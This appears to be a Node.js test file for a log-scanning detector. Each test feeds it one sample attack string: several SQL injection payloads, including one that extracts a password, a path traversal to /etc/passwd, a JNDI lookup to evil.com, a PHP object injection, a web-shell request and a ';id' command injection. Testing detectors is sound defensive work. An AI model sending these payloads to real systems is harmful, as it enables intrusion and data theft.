// Detects SQL injection, path traversal, JNDI, PHP object injection, upload, and command injection patterns in a single line (bin/log-evidence.mjs lineRules).
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { lineRules } from '../log-evidence.mjs';

test('returns empty array for benign text', () => {
  assert.deepEqual(lineRules('hello world'), []);
});

test('detects sqli-blind-extraction with ASCII and SUBSTR', () => {
  assert.deepEqual(lineRules("SELECT ASCII(SUBSTR(password,1,1)) FROM users"), ['sqli-blind-extraction']);
});

test('detects sqli-time-based with AND SLEEP', () => {
  assert.deepEqual(lineRules("SELECT * FROM users WHERE id=1 AND SLEEP(5)"), ['sqli-time-based']);
});

test('detects sqli-union with UNION SELECT', () => {
  assert.deepEqual(lineRules("SELECT * FROM users WHERE id=1 UNION SELECT username, password"), ['sqli-union']);
});

test('detects sqli-schema-probe with information_schema', () => {
  assert.deepEqual(lineRules("SELECT table_name FROM information_schema.tables"), ['sqli-schema-probe']);
});

test('detects path-traversal with ../etc/passwd', () => {
  assert.deepEqual(lineRules('GET /../../etc/passwd HTTP/1.1'), ['path-traversal']);
});

test('detects jndi-lookup with jndi:ldap', () => {
  assert.deepEqual(lineRules('User-Agent: ${jndi:ldap://evil.com/a}'), ['jndi-lookup']);
});

test('detects php-object-injection with O: pattern', () => {
  assert.deepEqual(lineRules('O:4:"User":1:{s:1:"a";}'), ['php-object-injection']);
});

test('detects upload-dir-php-request with GET /uploads/shell.php', () => {
  assert.deepEqual(lineRules('"GET /dir/uploads/shell.php?x=1 HTTP/1.1"'), ['upload-dir-php-request']);
});

test('detects command-injection with ; id', () => {
  assert.deepEqual(lineRules('"GET /page?file=1;id HTTP/1.1"'), ['command-injection']);
});
